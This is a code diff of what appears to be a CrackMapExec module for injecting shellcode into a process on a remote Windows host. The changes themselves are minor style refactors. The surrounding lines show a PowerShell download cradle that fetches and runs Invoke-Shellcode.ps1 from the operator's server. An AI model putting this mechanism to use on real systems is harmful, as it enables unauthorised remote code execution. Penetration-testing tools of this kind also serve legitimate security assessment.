@@ -19,7 +19,7 @@ class CMEModule:
             PROCID   Process ID to inject into (default: current powershell process)
         '''
 
-        if not 'PATH' in module_options:
+        if 'PATH' not in module_options:
             context.log.error('PATH option is required!')
             exit(1)
 
@@ -46,7 +46,7 @@ class CMEModule:
                                                               shellcode=os.path.basename(self.shellcode_path))
 
         if self.procid:
-            payload += ' -ProcessID {}'.format(self.procid)
+            payload += f' -ProcessID {self.procid}'
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)
 
@@ -54,7 +54,7 @@ class CMEModule:
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
-        if 'Invoke-Shellcode.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-Shellcode.ps1':
             request.send_response(200)
             request.end_headers()
 
